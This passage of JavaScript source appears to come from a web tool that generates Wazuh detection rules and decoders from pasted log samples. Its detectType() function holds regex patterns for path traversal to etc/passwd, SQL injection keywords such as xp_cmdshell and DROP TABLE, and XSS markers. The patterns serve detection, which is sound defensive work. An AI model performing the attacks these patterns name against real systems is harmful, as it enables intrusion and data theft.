    "06/29/2026-10:23:11.123456  [**] [1:2012345:3] ET MALWARE Payload [**] {TCP} 203.0.113.5:54321 -> 10.0.0.1:80",
    "06/29/2026-11:30:00.654321  [**] [1:2023456:2] ET SCAN Potential SSH Scan [**] {TCP} 10.0.0.50:12345 -> 192.168.1.1:22",
    "06/29/2026-12:00:00.987654  [**] [1:2034567:1] GPL DNS SPOOF query response [**] {UDP} 8.8.8.8:53 -> 192.168.1.100:54321",
  ],
  cisco_asa: [
    '%ASA-4-106023: Deny tcp src outside:203.0.113.5/54321 dst inside:10.0.0.1/80 by access-group "OUTSIDE_IN"',
    '%ASA-4-106023: Deny udp src dmz:10.0.0.50/12345 dst outside:8.8.8.8/53 by access-group "DMZ_OUT"',
    '%ASA-5-111008: User "admin" executed "enable" command on "192.168.1.100" - authentication failed',
  ],
};

// ==================== STATE ====================
var selMitre = [],
  curTab = "rule",
  genData = {};
var toastTimer = null;

// ==================== THEME ====================
(function () {
  var saved = localStorage.getItem("wazgenTheme") || "dark";
  if (saved === "light") document.body.classList.add("light");
})();
function toggleTheme() {
  document.body.classList.toggle("light");
  localStorage.setItem(
    "wazgenTheme",
    document.body.classList.contains("light") ? "light" : "dark",
  );
}

// ==================== UTILITIES ====================
function toast(msg) {
  var el = document.getElementById("toast");
  el.textContent = msg;
  el.classList.add("show");
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(function () {
    el.classList.remove("show");
  }, 2500);
}

function getEl(id) {
  return document.getElementById(id);
}

function escXml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// ==================== NAVIGATION ====================
function showSection(name) {
  document.querySelectorAll(".section").forEach(function (s) {
    s.classList.remove("active");
  });
  var el = getEl("sec-" + name);
  if (el) el.classList.add("active");
  document
    .querySelectorAll(".nav-links button[data-sec]")
    .forEach(function (b) {
      b.classList.toggle("active", b.dataset.sec === name);
    });
  var hero = getEl("heroSec");
  if (hero) hero.style.display = name === "generator" ? "block" : "none";
  if (name === "database") renderDB();
  if (name === "mitre") renderMitreMap();
  window.scrollTo({ top: 0, behavior: "smooth" });
}

// ==================== EXAMPLES ====================
var exData = {};
exData["ssh"] = DB[0].ex;
exData["squid"] = DB[14].ex;
exData["sudo"] = DB[5].ex;
exData["web"] = DB[15].ex;
exData["zeek"] = DB[51].ex;
exData["iptables"] = DB[12].ex;
exData["forti"] = DB[15].ex;
exData["azure"] = DB[31].ex;
exData["win4625"] = DB[35].ex;
exData["json"] =
  '{"timestamp":"2026-06-29T10:23:11Z","level":"error","message":"Access denied","user":"admin","ip":"192.168.1.100"}';
exData["kv"] =
  "2026-06-29 10:23:11 myapp ERROR: user=admin action=delete target=/etc/config status=failed";

// ==================== SMART PARSER ====================
function detectLogFormat(log) {
  if (log.charAt(0) === "{" || log.charAt(0) === "[") return "json";
  if (/EventID=\d+/i.test(log) && /LogName=/i.test(log)) return "windows";
  if (/^\d{4}[-\/]\d{2}[-\/]\d{2}/.test(log) || /^\w{3}\s+\d{1,2}/.test(log))
    return "syslog";
  if (
    /[=\s]+[\w.-]+@[\w.-]+/.test(log) ||
    /key\d*=|user=|status=|action=/i.test(log)
  )
    return "kv";
  if (/\t/.test(log) && /\d+\.\d+\.\d+\.\d+/.test(log)) return "tsv";
  if (/\d+\.\d+\.\d+\.\d+.*\[.*\]\s+"(GET|POST|PUT|DELETE|HEAD)/.test(log))
    return "httpd";
  return "generic";
}

function smartParse(log) {
  var format = detectLogFormat(log);
  var hasErr = /ERROR|FAIL|DENIED|DENY|REJECT|BLOCK|ALERT|CRITICAL/i.test(log);
  var hasWarn = /WARN|NOTICE|Warning/i.test(log);
  var ip = (log.match(/(\d+\.\d+\.\d+\.\d+)/) || [])[1] || null;
  var desc = hasErr
    ? "Anomaly detected"
    : hasWarn
      ? "Warning condition"
      : "Custom log event";
  var lv = hasErr ? 10 : hasWarn ? 7 : 5;
  var prematch = log.split(/\s+/).slice(0, 3).join(" ").replace(/[<>]/g, "");
  var matchText =
    log.split(/\s+/).slice(3, 6).join(" ").replace(/[<>"]/g, "") || "CUSTOM";

  if (format === "json")
    return {
      name: "JSON Log",
      prog: "custom",
      fmt: "json",
      dc: { n: "custom-json-decoder", p: "json", ty: "json", pm: "" },
      rl: { lv: lv, gr: "local", mt: null, ds: desc },
      mi: ["T1078"],
      th: "Monitor",
      srcip: ip,
      _format: "json",
    };
  if (format === "windows") {
    var eid = (log.match(/EventID=(\d+)/) || [])[1] || "0";
    return {
      name: "Windows Event",
      prog: "windows",
      fmt: "win",
      dc: { n: "custom-win-decoder", p: "windows-event", pm: "EventID=" + eid },
      rl: {
        lv: lv,
        gr: "win,local",
        mt: "EventID=" + eid,
        ds: "Windows Event " + eid,
      },
      mi: ["T1078"],
      th: "Monitor",
      srcip: ip,
      _format: "windows",
    };
  }
  if (format === "httpd")
    return {
      name: "HTTP Access",
      prog: "apache|nginx",
      fmt: "syslog",
      dc: {
        n: "httpd-access",
        p: "apache-httpd",
        pm: "GET|POST|PUT|DELETE",
        rx: '(\\d+\\.\\d+\\.\\d+\\.\\d+) - - \\[\\S+ \\+\\d+\\] "(\\w+) (\\S+) HTTP/[\\d\\.]+" (\\d+)',
        o: "srcip, method, url, status",
      },
      rl: { lv: 7, gr: "web,local", ds: "HTTP access detected" },
      mi: ["T1190"],
      th: "Monitor",
      srcip: ip,
      _format: "httpd",
    };
  return {
    name: "Custom Log",
    prog: "custom",
    fmt: "syslog",
    dc: { n: "custom-decoder", p: "", pm: prematch, rx: "", o: "message" },
    rl: { lv: lv, gr: "local", mt: matchText, ds: desc },
    mi: ["T1078"],
    th: "Monitor",
    srcip: ip,
    _format: format,
  };
}

// ==================== DETECT KNOWN ====================
function detectType(log) {
  for (var i = 0; i < DB.length; i++) {
    var e = DB[i];
    if (
      e.id === "ssh_fail" &&
      /sshd.*Failed password/i.test(log) &&
      !/invalid user/i.test(log)
    )
      return e;
    if (e.id === "ssh_inv" && /sshd.*invalid user/i.test(log)) return e;
    if (e.id === "ssh_ok" && /sshd.*Accepted/i.test(log)) return e;
    if (e.id === "ssh_pubkey" && /sshd.*Accepted publickey/i.test(log))
      return e;
    if (e.id === "squid" && /TCP_DENIED/i.test(log)) return e;
    if (
      e.id === "sudo_ok" &&
      /sudo.*COMMAND=/i.test(log) &&
      !/incorrect password/i.test(log)
    )
      return e;
    if (e.id === "sudo_fail" && /sudo.*incorrect password/i.test(log)) return e;
    if (e.id === "pam" && /FAILED LOGIN|authentication failure/i.test(log))
      return e;
    if (e.id === "ftp" && /vsftpd.*FAIL LOGIN/i.test(log)) return e;
    if (
      e.id === "web_trav" &&
      /\.\.\/|\.\.%2f|etc\/passwd/i.test(log) &&
      /GET|POST/i.test(log)
    )
      return e;
    if (e.id === "web_sqli" && /UNION SELECT|xp_cmdshell|DROP TABLE/i.test(log))
      return e;
    if (
      e.id === "web_xss" &&
      /<script|%3Cscript|onerror=|onload=|javascript:/i.test(log)
    )
      return e;
    if (e.id === "iptables" && /DROP IN=/i.test(log)) return e;
    if (e.id === "nftables" && /nft DROP/i.test(log)) return e;
    if (
      e.id === "fortigate" &&
      /action="deny"/i.test(log) &&
      /fortigate|fgt/i.test(log)
    )
      return e;
    if (e.id === "cisco_asa" && /ASA.*Deny/i.test(log)) return e;
    if (e.id === "paloalto" && /THREAT/i.test(log)) return e;
    if (e.id === "suricata" && /\*\*\] \[1:/i.test(log) && !/ET DNS/i.test(log))
      return e;
    if (e.id === "suricata_dns" && /ET DNS/i.test(log)) return e;
    if (e.id === "zeek_conn" && /\tREJ\t/i.test(log)) return e;
    if (e.id === "win_4625" && /EventID=4625/i.test(log)) return e;
    if (e.id === "win_4688" && /EventID=4688/i.test(log)) return e;
    if (e.id === "win_7045" && /EventID=7045/i.test(log)) return e;
    if (e.id === "sysmon_1" && /EventID=1\b.*Image=/i.test(log)) return e;
    if (e.id === "sysmon_3" && /EventID=3\b.*DestinationIp=/i.test(log))
      return e;
    if (e.id === "sysmon_11" && /EventID=11\b.*TargetFilename=/i.test(log))
      return e;
    if (e.id === "win_defender" && /EventID=1116/i.test(log)) return e;
    if (
      e.id === "docker" &&
      /container.*mount|privileged|cap_sys_admin/i.test(log)
    )
      return e;
    if (e.id === "k8s" && /pod\/exec/i.test(log)) return e;
    if (e.id === "cron" && /CRON.*CMD/i.test(log)) return e;
    if (
      e.id === "mysql" &&
      /Access denied for user.*@.*\(using password/i.test(log)
    )
      return e;
    if (e.id === "postgres" && /password authentication failed/i.test(log))
      return e;
    if (e.id === "fail2ban" && /fail2ban.*Ban/i.test(log)) return e;
    if (e.id === "postfix" && /postfix.*reject/i.test(log)) return e;
    if (e.id === "dovecot" && /dovecot.*auth failed/i.test(log)) return e;
    if (e.id === "dns_tunnel" && /IN TXT/i.test(log) && /named/i.test(log))
      return e;
  }
  return null;
}

// ==================== GENERATE ====================
function generateRule() {
  var log = getEl("logInput").value.trim();
  if (!log) {
    toast("Paste log sample dulu!");
    getEl("logInput").focus();
    return;
  }
  var det = detectType(log),
    parsed;
  if (det) {
    parsed = JSON.parse(JSON.stringify(det));
    var ip = log.match(/(\d+\.\d+\.\d+\.\d+)/);
    parsed.srcip = ip ? ip[1] : null;
    parsed.name = det.name;
    parsed._source = "db";
  } else {
    parsed = smartParse(log);
    parsed._source = "smart";
  }
  var rid = parseInt(getEl("ruleId").value) || 100200;
  var lv =
    getEl("levelOverride").value === "auto"
      ? parsed.rl.lv || 7
      : parseInt(getEl("levelOverride").value);
  var mitre = selMitre.length > 0 ? selMitre : parsed.mi || ["T1078"];
  var r = parsed.rl,
    grp = escXml(r.gr || "local"),
    desc = escXml(r.ds || "Log detected"),
    mtRaw = r.mt ? escXml(r.mt) : null,
    isRaw = r.is ? escXml(r.is) : null;
  var mxml = "";
  for (var m = 0; m < mitre.length; m++) {
    mxml +=
      "      <mitre>\n        <id>" + mitre[m] + "</id>\n      </mitre>\n";
  }
  mxml = mxml.trim();

  var ruleXml = "";
  if (parsed._format === "json" || parsed.fmt === "json") {
    ruleXml =
      '<group name="' +
      grp +
      '">\n  <rule id="' +
      rid +
      '" level="' +
      lv +
      '">\n    <decoded_as>json</decoded_as>\n    <field name="level">error|Error|ERROR</field>\n    <description>' +
      desc +
      "</description>\n    <group>" +
      grp +
      "</group>\n" +
      mxml +
      "\n  </rule>\n</group>";
  } else if (isRaw && mtRaw) {
    ruleXml =
      '<group name="' +
      grp +
      '">\n  <rule id="' +
      rid +
      '" level="' +
      lv +
      '">\n    <if_sid>' +
      isRaw +
      "</if_sid>\n    <match>" +
      mtRaw +
      "</match>\n    <description>" +
      desc +
      "</description>\n    <group>" +
      grp +
      "</group>\n" +
      mxml +
      "\n  </rule>\n</group>";
  } else if (mtRaw) {
    ruleXml =
      '<group name="' +
      grp +
      '">\n  <rule id="' +
      rid +
      '" level="' +
      lv +
      '">\n    <match>' +
      mtRaw +
      "</match>\n    <description>" +
      desc +
      "</description>\n    <group>" +
      grp +
      "</group>\n" +
      mxml +
      "\n  </rule>\n</group>";
  } else {
    ruleXml =
      '<group name="' +
      grp +
      '">\n  <rule id="' +
      rid +
      '" level="' +
      lv +
      '">\n    <match>ERROR|FAIL|DENIED</match>\n    <description>' +
      desc +
      "</description>\n    <group>" +
      grp +
      "</group>\n" +
      mxml +
      "\n  </rule>\n</group>";
  }
  var d = parsed.dc,
    decXml = "";
  if (d && d.ty === "json") {
    decXml =
      '<decoder name="' +
      escXml(d.n) +
      '">\n  <parent>json</parent>\n  <type>json</type>\n  <prematch>' +
      escXml(d.pm || "") +
      "</prematch>\n</decoder>";
  } else if (d && d.rx) {
    decXml =
      '<decoder name="' +
      escXml(d.n) +
      '">\n  <parent>' +
      escXml(d.p || "") +
      "</parent>\n  <prematch>" +
      escXml(d.pm || "") +
      "</prematch>\n  <regex>" +
      d.rx +
      "</regex>\n  <order>" +
      escXml(d.o || "") +
      "</order>\n</decoder>";
  } else if (d) {
    decXml =
      '<decoder name="' +
      d.n +
      '">\n  <parent>' +
      (d.p || "") +
      "</parent>\n  <prematch>" +
      (d.pm || "") +
      "</prematch>\n</decoder>";
  } else {
    decXml =
      '<decoder name="custom-decoder">\n  <prematch>PREFIX</prematch>\n  <regex>regex</regex>\n  <order>field1, field2</order>\n</decoder>';
  }

  var loc = "/var/log/" + (parsed.prog || "custom") + "/access.log";
  var oss =
    "<localfile>\n  <log_format>" +
    parsed.fmt +
    "</log_format>\n  <location>" +
    loc +
    "</location>\n</localfile>";
  var safe = log.replace(/'/g, "\\'");
  if (safe.length > 200) safe = safe.substring(0, 200);
  var tc =
    "echo '" +
    safe +
    "' | /var/ossec/bin/wazuh-logtest -v\n\nsudo systemctl restart wazuh-manager";

  genData = {
    rule: ruleXml,
    decoder: decXml,
    ossec: oss,
    test: tc,
    editor: ruleXml,
  };
  var fmtLabels = {
    syslog: "Syslog",
    json: "JSON",
    win: "Windows Event",
    kv: "Key=Value",
    httpd: "HTTP Access",
    generic: "Generic",
    windows: "Windows Event",
  };
  var fmt = parsed.fmt || parsed._format || "generic";
  getEl("metaCards").innerHTML =
    '<div class="meta-card"><div class="meta-label">Rule ID</div><div class="meta-value">' +
    rid +
    "</div></div>" +
    '<div class="meta-card"><div class="meta-label">Level</div><div class="meta-value">' +
    lv +
    "</div></div>" +
    '<div class="meta-card"><div class="meta-label">Type</div><div class="meta-value" style="font-size:11px">' +
    (parsed.name || "Custom") +
    "</div></div>" +
    '<div class="meta-card"><div class="meta-label">Format</div><div class="meta-value" style="font-size:10px;font-family:var(--mono)">' +
    (fmtLabels[fmt] || fmt) +
    "</div></div>" +
    '<div class="meta-card"><div class="meta-label">MITRE</div><div class="meta-value" style="font-size:10px">' +
    mitre.join(", ") +
    "</div></div>" +
    '<div class="meta-card"><div class="meta-label">Source</div><div class="meta-value" style="font-size:10px">' +
    (parsed._source === "smart" ? "Smart Parser" : "Database") +
    "</div></div>";
  // Auto-increment rule ID
  getEl("ruleId").value = rid + 1;
  getEl("outPanel").style.display = "block";
  getEl("validBadge").style.display = "none";
  getEl("outEditor").style.display = "none";
  getEl("outCode").style.display = "block";
  switchTab("rule");
  getEl("outPanel").scrollIntoView({ behavior: "smooth", block: "start" });
  toast(
    parsed._source === "smart"
      ? "Smart parser: " + parsed.name + " detected!"
      : "Rule generated!",
  );
}

// ==================== BATCH UPLOAD ====================
function handleBatchFile() {
  var file = getEl("batchFile").files[0];
  if (!file) {
    toast("Pilih file dulu!");
    return;
  }
  var reader = new FileReader();
  reader.onload = function (e) {
    var lines = e.target.result.split("\n").filter(function (l) {
      return l.trim() !== "";
    });
    if (lines.length > 200) {
      toast("Max 200 lines, loading first 200");
      lines = lines.slice(0, 200);
    }
    // Show first line in input
    getEl("logInput").value = lines[0];
    // Generate batch rules
    var allRules = "";
    var rid = parseInt(getEl("ruleId").value) || 100200;
    for (var i = 0; i < lines.length; i++) {
      var log = lines[i].trim();
      if (!log) continue;
      var det = detectType(log);
      var parsed = det ? JSON.parse(JSON.stringify(det)) : smartParse(log);
      var lvOv = getEl("levelOverride").value;
      var lv = lvOv === "auto" ? parsed.rl.lv || 7 : parseInt(lvOv);
      var mitre = selMitre.length > 0 ? selMitre : parsed.mi || ["T1078"];
      var mxml = "";
      for (var m = 0; m < mitre.length; m++) {
        mxml +=
          "      <mitre>\n        <id>" + mitre[m] + "</id>\n      </mitre>\n";
      }
      var batchMt = parsed.rl.mt ? escXml(parsed.rl.mt) : null;
      var batchDs = escXml(
        (parsed.rl.ds || "Log") + " [Batch #" + (i + 1) + "]",
      );
      var rule =
        '<group name="' +
        escXml(parsed.rl.gr || "local") +
        '">\n  <rule id="' +
        (rid + i) +
        '" level="' +
        lv +
        '">\n' +
        (batchMt ? "    <match>" + batchMt + "</match>\n    " : "") +
        "<description>" +
        batchDs +
        "</description>\n    <group>" +
        escXml(parsed.rl.gr || "local") +
        "</group>\n" +
        mxml.trim() +
        "\n  </rule>\n</group>";
      allRules +=
        "<!-- Line " + (i + 1) + ": " + parsed.name + " -->\n" + rule + "\n\n";
    }
    getEl("batchOutput").textContent = allRules;
    getEl("batchPanel").style.display = "block";
    getEl("batchPanel").scrollIntoView({ behavior: "smooth", block: "start" });
    toast("Generated " + lines.length + " rules!");
  };
  reader.readAsText(file);
}

// ==================== VALIDATE XML ====================
function validateXml() {
  var text = genData[curTab] || genData.rule;
  if (!text) {
    toast("No XML to validate");
    return;
  }
  var errors = [];
  var lines = text.split("\n");
  var openTags = [];
  for (var i = 0; i < lines.length; i++) {
    var line = lines[i].trim();
    if (!line || line.indexOf("<!--") === 0) continue; // skip comments
    // Find all XML tags in this line
    var tagRegex = /<(\/?)([\w.-]+)([^>]*?)(\/?)\s*>/g;
    var match;
    while ((match = tagRegex.exec(line)) !== null) {
      var isClose = match[1] === "/";
      var tagName = match[2];
      var attrs = match[3];
      var isSelfClose = match[4] === "/";
      // Skip malformed tags like <tagname/something>
      if (!isClose && !isSelfClose && attrs.charAt(0) === "/") {
        errors.push(
          "Line " +
            (i + 1) +
            ": Malformed tag '" +
            tagName +
            attrs +
            "></" +
            tagName +
            "> expected",
        );
        continue;
      }
      if (isClose) {
        if (openTags.length === 0) {
          errors.push("Line " + (i + 1) + ": Unexpected </" + tagName + ">");
        } else if (openTags[openTags.length - 1] !== tagName) {
          errors.push(
            "Line " +
              (i + 1) +
              ": Expected </" +
              openTags[openTags.length - 1] +
              "> got </" +
              tagName +
              ">",
          );
        } else openTags.pop();
      } else if (!isSelfClose) {
        openTags.push(tagName);
      }
    }
  }
  if (openTags.length > 0) errors.push("Unclosed: " + openTags.join(", "));
  if (errors.length === 0) {
    getEl("validBadge").style.display = "inline";
    getEl("validBadge").innerHTML =
      '<span class="badge active" style="cursor:default;background:var(--success-bg);color:var(--success);border-color:var(--success)"><i class="ti ti-check"></i> Valid XML</span>';
    toast("XML valid!");
  } else {
    getEl("validBadge").style.display = "inline";
    getEl("validBadge").innerHTML =
      '<span class="badge active" style="cursor:default;background:var(--danger-bg);color:var(--danger);border-color:var(--danger)"><i class="ti ti-alert-triangle"></i> ' +
      errors.length +
      " errors</span>";
    toast("XML errors: " + errors[0].substring(0, 80));
  }
}

// ==================== TABS ====================
var tabLabels = {
  rule: "local_rules.xml",
  decoder: "local_decoder.xml",
  ossec: "ossec.conf",
  test: "terminal",
  editor: "rule_editor.xml",
  preview: "alert_preview",
};
function switchTab(name) {
  curTab = name;
  getEl("outLabel").textContent = tabLabels[name] || "output";
  if (name === "preview") {
    getEl("outEditor").style.display = "none";
    getEl("outCode").style.display = "block";
    getEl("outCode").textContent = generatePreview();
    return;
  }
  getEl("outEditor").style.display = name === "editor" ? "block" : "none";
  getEl("outCode").style.display = name === "editor" ? "none" : "block";
  if (name === "editor") {
    getEl("outEditor").value = genData.rule || "";
  } else {
    getEl("outCode").textContent = genData[name] || "";
  }
}

function generatePreview() {
  var log = getEl("logInput").value.trim();
  var det = detectType(log);
  var p = det ? JSON.parse(JSON.stringify(det)) : smartParse(log);
  var lv =
    getEl("levelOverride").value === "auto"
      ? p.rl.lv || 7
      : parseInt(getEl("levelOverride").value);
  var ip = log.match(/(\d+\.\d+\.\d+\.\d+)/);
  var srcip = ip ? ip[1] : "-";
  var user = p.rl.mt || "-";
  var mitre = selMitre.length > 0 ? selMitre : p.mi || ["-"];
  var lvLabel =
    lv <= 4 ? "INFO" : lv <= 7 ? "MEDIUM" : lv <= 11 ? "HIGH" : "CRITICAL";
  var lvColor =
    lv <= 4 ? "34d399" : lv <= 7 ? "fbbf24" : lv <= 11 ? "f97316" : "ef4444";
  var rid = parseInt(getEl("ruleId").value) || 100200;
  var logShort = log.length > 80 ? log.substring(0, 80) + "..." : log;

  return "".concat(
    "┌─────────────────────────────────────────────────────────┐\n",
    "│  ",
    String.fromCharCode(0x1f6a8),
    "  ALERT PREVIEW — Level ",
    lv,
    " ",
    lvLabel,
    "                 │\n",
    "├─────────────────────────────────────────────────────────┤\n",
    "│  Rule ID    ",
    rid,
    "                                      │\n",
    "│  Level      ",
    lv,
    " — ",
    lvLabel,
    "                                    │\n",
    "│  Description  ",
    p.rl.ds || "-",
    "          │\n",
    "│  Timestamp  ",
    new Date().toISOString().replace("T", " ").substring(0, 19),
    "             │\n",
    "│  Source IP  ",
    srcip,
    "                                          │\n",
    "│  Program    ",
    p.prog || "-",
    "                                          │\n",
    "│  MITRE      ",
    mitre.join(", "),
    "                                    │\n",
    "├─────────────────────────────────────────────────────────┤\n",
    "│  Log: ",
    logShort,
    "   │\n",
    "├─────────────────────────────────────────────────────────┤\n",
    "│  ",
    String.fromCharCode(0x26a1),
    " Alert akan muncul di Wazuh dashboard dengan     │\n",
    '│     group "',
    p.rl.gr || "local",
    '" dan tag MITRE ',
    mitre[0],
    "   │\n",
    "└─────────────────────────────────────────────────────────┘",
  );
}

// ==================== COPY ====================
function copyOutput() {
  var text = curTab === "editor" ? getEl("outEditor").value : genData[curTab];
  if (!text) return;
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text).then(function () {
      toast("Copied!");
    });
  } else {
    var ta = document.createElement("textarea");
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    toast("Copied!");
  }
}

// ==================== RESET ====================
function resetAll() {
  getEl("logInput").value = "";
  getEl("outPanel").style.display = "none";
  getEl("batchPanel").style.display = "none";
  document.querySelectorAll("#mitreBadges .badge").forEach(function (b) {
    b.classList.remove("active");
  });
  selMitre = [];
  getEl("ruleId").value = 100200;
  getEl("levelOverride").value = "auto";
  toast("Reset");
}

// ==================== DATABASE ====================
var DB_CATS = [
  { id: "all", name: "All" },
  { id: "auth", name: "Authentication" },
  { id: "fw", name: "Firewall" },
  { id: "web", name: "Web" },
  { id: "cloud", name: "Cloud" },
  { id: "win", name: "Windows" },
  { id: "ids", name: "IDS/IPS" },
  { id: "db", name: "Database" },
  { id: "net", name: "Network" },
  { id: "email", name: "Email" },
  { id: "container", name: "Container" },
  { id: "malware", name: "Malware" },
  { id: "other", name: "Other" },
];

function renderDB() {
  var list = getEl("dbList"),
    term = getEl("dbSearch").value.toLowerCase();
  var cat = "all";
  document.querySelectorAll("#catFilter button").forEach(function (b) {
    if (b.classList.contains("active")) cat = b.dataset.cat;
  });
  var items = [];
  for (var i = 0; i < DB.length; i++) {
    var e = DB[i];
    if (cat !== "all" && e.cat !== cat) continue;
    if (
      term &&
      e.name.toLowerCase().indexOf(term) === -1 &&
      e.id.indexOf(term) === -1 &&
      e.desc.toLowerCase().indexOf(term) === -1
    )
      continue;
    items.push(e);
  }
  var html = "";
  for (var j = 0; j < items.length; j++) {
    var item = items[j];
    var tags =
      '<span class="db-item-tag">' +
      item.prog +
      '</span><span class="db-item-tag">Lv ' +
      item.rl.lv +
      "</span>";
    if (item.mi) {
      for (var mi = 0; mi < item.mi.length; mi++) {
        tags +=
          '<span class="db-item-tag" style="color:var(--accent);background:var(--accent-bg)">' +
          item.mi[mi] +
          "</span>";
      }
    }
    html +=
      '<div class="db-item" onclick="showDbDetail(\'' +
      item.id +
      '\')"><div class="db-item-name">' +
      item.name +
      '</div><div class="db-item-tags">' +
      tags +
      "</div></div>";
  }
  list.innerHTML =
    html ||
    '<div style="text-align:center;padding:30px;color:var(--muted2);font-size:13px">No patterns found (' +
      items.length +
      "/" +
      DB.length +
      ")</div>";
  getEl("dbDetail").style.display = "none";
}

function showDbDetail(id) {
  var entry = null;
  for (var i = 0; i < DB.length; i++) {
    if (DB[i].id === id) {
      entry = DB[i];
      break;
    }
  }
  if (!entry) return;
  getEl("ddName").textContent = entry.name + " (Level " + entry.rl.lv + ")";
  var mh = "";
  if (entry.mi) {
    for (var j = 0; j < entry.mi.length; j++) {
      mh +=
        '<span class="badge active" style="cursor:default;font-size:9px;padding:2px 7px">' +
        entry.mi[j] +
        "</span> ";
    }
  }
  var h =
    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px"><div><span class="form-label">Category</span><span style="font-size:12px;text-transform:capitalize">' +
    entry.cat +
    '</span></div><div><span class="form-label">Program</span><span style="font-size:12px">' +
    entry.prog +
    "</span></div></div>" +
    '<div class="form-label">MITRE</div><div class="badges">' +
    mh +
    "</div>" +
    '<div class="tabs" style="margin-top:6px"><button class="active" onclick="dbTabHandler(this,\'' +
    entry.id +
    "','ex')\">Example</button><button onclick=\"dbTabHandler(this,'" +
    entry.id +
    "','rule')\">Rule</button><button onclick=\"dbTabHandler(this,'" +
    entry.id +
    "','decoder')\">Decoder</button></div>" +
    '<div class="output-box"><pre id="ddOut">' +
    escXml(entry.ex) +
    "</pre></div>" +
    '<div style="margin-top:6px"><button class="btn-sm btn-secondary" onclick="useDbEx(\'' +
    entry.id +
    '\')"><i class="ti ti-wand"></i> Use sample</button></div>';
  getEl("ddContent").innerHTML = h;
  getEl("dbDetail").style.display = "block";
}

function dbTabHandler(btn, id, type) {
  btn.parentElement.querySelectorAll("button").forEach(function (b) {
    b.classList.remove("active");
  });
  btn.classList.add("active");
  var e = null;
  for (var i = 0; i < DB.length; i++) {
    if (DB[i].id === id) {
      e = DB[i];
      break;
    }
  }
  if (!e) return;
  var out = getEl("ddOut");
  if (type === "ex") {
    out.textContent = e.ex;
    return;
  }
  if (type === "rule") {
    var m = "";
    if (e.mi) {
      for (var k = 0; k < e.mi.length; k++) {
        m +=
          "      <mitre>\n        <id>" + e.mi[k] + "</id>\n      </mitre>\n";
      }
    }
    m = m.trim();
    var r = e.rl;
    var rule =
      '<group name="' +
      (r.gr || "local") +
      '">\n  <rule id="100200" level="' +
      r.lv +
      '">\n';
    if (r.is) rule += "    <if_sid>" + r.is + "</if_sid>\n    ";
    if (r.mt) rule += "<match>" + r.mt + "</match>\n    ";
    rule +=
      "<description>" +
      r.ds +
      "</description>\n    <group>" +
      (r.gr || "local") +
      "</group>\n" +
      m +
      "\n  </rule>\n</group>";
    out.textContent = rule;
  } else if (type === "decoder") {
    var d = e.dc;
    if (d.ty === "json") {
      out.textContent =
        '<decoder name="' +
        d.n +
        '">\n  <parent>json</parent>\n  <type>json</type>\n  <prematch>' +
        (d.pm || "") +
        "</prematch>\n</decoder>";
    } else {
      out.textContent =
        '<decoder name="' +
        d.n +
        '">\n  <parent>' +
        (d.p || "") +
        "</parent>\n  <prematch>" +
        (d.pm || "") +
        "</prematch>\n  <regex>" +
        (d.rx || "") +
        "</regex>\n  <order>" +
        (d.o || "") +
        "</order>\n</decoder>";
    }
  }
}

function useDbEx(id) {
  var e = null;
  for (var i = 0; i < DB.length; i++) {
    if (DB[i].id === id) {
      e = DB[i];
      break;
    }
  }
  if (!e) return;
  getEl("logInput").value = e.ex;
  showSection("generator");
  toast("Loaded: " + e.name);
}

// ==================== MITRE MAP ====================
function renderMitreMap() {
  var grid = getEl("mitreMapGrid");
  var tacFilter = getEl("mitreTacticFilter");
  var selTac = "all";
  tacFilter.querySelectorAll("button").forEach(function (b) {
    if (b.classList.contains("active")) selTac = b.dataset.tac;
  });

  // Count coverage
  var coverage = {};
  for (var i = 0; i < DB.length; i++) {
    var mi = DB[i].mi;
    if (mi) {
      for (var j = 0; j < mi.length; j++) {
        coverage[mi[j]] = (coverage[mi[j]] || 0) + 1;
      }
    }
  }
  var totalCovered = Object.keys(coverage).length;
  getEl("mitreStats").textContent =
    totalCovered + "/" + MITRE_TECH.length + " techniques covered";

  // Group by tactic
  var byTac = {};
  for (var k = 0; k < MITRE_TECH.length; k++) {
    var t = MITRE_TECH[k];
    if (!byTac[t.tac]) byTac[t.tac] = [];
    byTac[t.tac].push(t);
  }

  // Populate filter
  tacFilter.innerHTML = '<button class="active" data-tac="all">All</button>';
  var tacs = Object.keys(byTac).sort();
  for (var ti = 0; ti < tacs.length; ti++) {
    tacFilter.innerHTML +=
      '<button data-tac="' + tacs[ti] + '">' + tacs[ti] + "</button>";
  }

  // Render grid
  var html = "";
  for (var tt = 0; tt < tacs.length; tt++) {
    var tac = tacs[tt];
    if (selTac !== "all" && selTac !== tac) continue;
    html +=
      '<div style="margin-bottom:14px"><div class="form-label" style="font-size:11px;margin-bottom:4px;text-transform:uppercase;letter-spacing:0.5px">' +
      tac +
      '</div><div style="display:flex;flex-wrap:wrap;gap:4px">';
    for (var u = 0; u < byTac[tac].length; u++) {
      var tech = byTac[tac][u];
      var count = coverage[tech.id] || 0;
      var cls = count > 0 ? "badge active" : "badge";
      var style =
        count > 0
          ? "cursor:default;background:var(--accent-bg);color:var(--accent);border-color:var(--accent)"
          : "cursor:default;opacity:0.5";
      html +=
        '<span class="' +
        cls +
        '" style="' +
        style +
        '">' +
        tech.id +
        '<span style="font-size:8px;margin-left:3px">' +
        (count > 0 ? "(" + count + ")" : "(0)") +
        "</span></span>";
    }
    html += "</div></div>";
  }
  grid.innerHTML = html;
}

// ==================== INSTALL ====================
var INST_SRV_UB = [
  "# Wazuh Server — Ubuntu 22.04+",
  "sudo apt-get update -y",
  "sudo apt-get install -y curl wget gnupg apt-transport-https",
  "",
  "curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import",
  "sudo chmod 644 /usr/share/keyrings/wazuh.gpg",
  'echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list',
  "",
  "sudo apt-get update -y",
  "sudo apt-get install -y wazuh-manager wazuh-indexer wazuh-dashboard",
  "",
  "sudo systemctl daemon-reload",
  "sudo systemctl enable wazuh-manager wazuh-indexer wazuh-dashboard",
